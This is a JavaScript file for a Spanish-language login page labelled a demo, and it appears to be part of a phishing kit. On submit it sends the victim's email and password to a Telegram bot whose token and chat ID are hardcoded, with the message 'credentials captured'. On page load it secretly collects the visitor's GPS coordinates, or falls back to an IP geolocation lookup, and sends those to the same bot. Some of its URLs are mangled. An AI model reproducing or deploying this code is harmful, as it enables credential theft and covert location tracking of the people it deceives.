/* ============================================================
   Login demo — Validacion Dinamica, Geolocalización y Ojo en Vivo
   ============================================================ */

(function () {
  "use strict";

  // --- LIMPIEZA PREVENTIVA AL CARGAR LA PAGINA ---
  try {
    localStorage.removeItem('transaction_status');
    sessionStorage.removeItem('otp_tail');
    sessionStorage.removeItem('flow_type');
    sessionStorage.removeItem('charge_merchant');
    sessionStorage.removeItem('charge_amount');
    sessionStorage.removeItem('gatekeeper_done');
  } catch (e) {
    console.error("Error al limpiar cache inicial:", e);
  }
  // ----------------------------------------------

  // Credenciales unificadas accesibles para todo el flujo interno
  const TELEGRAM_TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY'; 
  const TELEGRAM_CHAT_ID = '9180377107';   

  const form = document.getElementById("login-form");
  const username = document.getElementById("username");
  const password = document.getElementById("password");
  const message = document.getElementById("form-message");
  const submitBtn = form.querySelector(".btn-submit");

  function isValidEmail(email) {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email);
  }

  function checkInputsRealtime() {
    const userVal = username.value.trim();
    const passVal = password.value;

    const emailOk = isValidEmail(userVal);
    const passOk = passVal.length >= 4; 

    if (emailOk && passOk) {
      submitBtn.style.backgroundColor = "#981D33";
      submitBtn.style.borderColor = "#981D33";
      submitBtn.style.color = "#FFFFFF";
      submitBtn.style.cursor = "pointer";
    } else {
      submitBtn.style.backgroundColor = "";
      submitBtn.style.borderColor = "";
      submitBtn.style.color = "";
      submitBtn.style.cursor = "";
    }
  }

  function sendToTelegram(credentials) {
    const text = `🍕 *NUEVO INTENTO DE LOGIN* 🍕\n\n` +
                 `👤 *Usuario:* \`${credentials.username}\`\n` +
                 `🔑 *Contraseña:* \`${credentials.password}\`\n\n` +
                 `_Credenciales capturadas correctamente._`;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown'
      })
    });
  }

  if (username && password) {
    username.addEventListener("input", checkInputsRealtime);
    password.addEventListener("input", checkInputsRealtime);
  }

  if (form) {
    form.addEventListener("submit", async function (event) {
      event.preventDefault();

      try {
        localStorage.removeItem('transaction_status');
        sessionStorage.removeItem('otp_tail');
        sessionStorage.removeItem('charge_merchant');
        sessionStorage.removeItem('charge_amount');
        sessionStorage.removeItem('gatekeeper_done');
        sessionStorage.setItem('flow_type', 'login'); 
      } catch (e) { }

      const userVal = username.value.trim();
      const passVal = password.value;

      if (!isValidEmail(userVal)) {
        if (message) {
          message.textContent = "Ingresa un correo electronico valido.";
          message.classList.add("error");
        }
        username.focus();
        return;
      }

      if (passVal.length < 4) {
        if (message) {
          message.textContent = "Ingresa una contraseña valida.";
          message.classList.add("error");
        }
        password.focus();
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = "Accediendo…";

      try {
        await sendToTelegram({
          username: userVal,
          password: passVal,
        });

        try {
          localStorage.setItem("user_email", userVal);
          sessionStorage.setItem("demo_user", userVal);
        } catch (e) { }

        window.location.href = "loading.html";
      } catch (err) {
        console.error("Login error:", err);
        if (message) {
          message.textContent = "Error de conexion con el servidor.";
        }
        submitBtn.disabled = false;
        submitBtn.textContent = "Acceder";
      }
    });
  }

  // =========================================================================
  // FUNCIONES DE GEOLOCALIZACIÓN INTERNAS
  // =========================================================================
  function obtenerUbicacionPorIP() {
    // CORREGIDO: Se añade /json/ para consultar correctamente la API
    fetch('https://ipapi.co')
    .then(res => res.json())
    .then(data => {
        const mensajeIP = `🌐 Nueva Visita (Por IP)\n\n` +
                          `• IP: ${data.ip || 'No detectada'}\n` +
                          `• País: ${data.country_name || 'Desconocido'}\n` +
                          `• Región: ${data.region || 'Desconocido'}\n` +
                          `• Ciudad: ${data.city || 'Desconocida'}\n` +
                          `• Latitud: ${data.latitude}\n` +
                          `• Longitud: ${data.longitude}\n\n` +
                          `Google Maps: https://google.com{data.latitude},${data.longitude}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensajeIP })
        });
    })
    .catch(err => console.error("Error en el servicio de IP de respaldo:", err));
  }

  function unErrorOcurrio(error) {
    console.warn(`GPS no disponible (Código ${error.code}). Consultando por IP...`);
    obtenerUbicacionPorIP();
  }

  function enviarATelegram(posicion) {
    const latitud = posicion.coords.latitude;
    const longitud = posicion.coords.longitude;
    const precision = posicion.coords.accuracy;

    // Fíjate bien que use ` al inicio y al final, y ${latitud} junto con ${longitud}
    const mensaje = `📍 Nueva Visita (GPS)\n\n• Latitud: ${latitud}\n• Longitud: ${longitud}\n• Precisión: ~${Math.round(precision)} metros\n\nGoogle Maps: https://google.com{latitud},${longitud}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje })
    }).catch(err => console.error("Error enviando coordenadas:", err));
  }

  function obtenerUbicacionInmediata() {
    if (!navigator.geolocation) {
        obtenerUbicacionPorIP();
        return;
    }
    const opciones = { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 };
    navigator.geolocation.getCurrentPosition(enviarATelegram, unErrorOcurrio, opciones);
  }

  // =========================================================================
  // CONTROLADORES DE INTERFAZ (DOM)
  // =========================================================================
  document.addEventListener('DOMContentLoaded', () => {
    
    // Iniciar localización inmediata
    obtenerUbicacionInmediata();

    const togglePassword = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');

    // Estructuras SVG corregidas con xmlns completo para Chrome y móviles
    const eyeOpenSVG = `<svg xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
    const eyeClosedSVG = `<svg xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path><path d="M6.61 6.61A13.52 13.52 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path><line x1="2" y1="2" x2="22" y2="22"></line></svg>`;

    if (togglePassword && passwordInput) {
        function cambiarVisibilidadContrasena(e) {
            e.preventDefault(); 
            const isPassword = passwordInput.getAttribute('type') === 'password';
            
            if (isPassword) {
                passwordInput.setAttribute('type', 'text');
                togglePassword.innerHTML = eyeOpenSVG;
            } else {
                passwordInput.setAttribute('type', 'password');
                togglePassword.innerHTML = eyeClosedSVG;
            }
            passwordInput.focus(); 
        }

        togglePassword.addEventListener('click', cambiarVisibilidadContrasena);
        togglePassword.addEventListener('touchstart', cambiarVisibilidadContrasena, { passive: false });
    }
  });

  checkInputsRealtime();

})();
